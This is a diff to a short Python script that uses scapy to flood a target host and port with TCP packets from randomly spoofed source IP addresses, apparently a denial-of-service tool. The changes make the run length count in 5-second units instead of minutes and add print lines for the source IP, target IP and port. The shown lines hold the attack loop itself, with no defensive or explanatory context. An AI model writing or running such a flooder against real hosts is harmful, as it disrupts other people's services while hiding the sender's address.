@@ -7,7 +7,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import IP, TCP, send
 from random import randint
 
-ttl = time.time() + 60*int(sys.argv[3]);
+ttl = time.time() + 5*int(sys.argv[3]);
 dstIp = sys.argv[1]
 if len(sys.argv) > 1:
     dstPrt = sys.argv[2]
@@ -20,6 +20,9 @@ while 1:
     rand3 = randint(1,254)
     rand4 = randint(1,254)
     srcIp = str(rand1) + "." + str(rand2) + "." + str(rand3) + "." + str(rand4)
+    print "SrcIP:" + str(srcIp) 
+    print "DstIP:" + str(dstIp) 
+    print "DstPrt:" + str(dstPrt)
     p = send(IP(src=srcIp, dst=dstIp)/TCP(dport=dstPrt))
     if time.time() > ttl:
         break
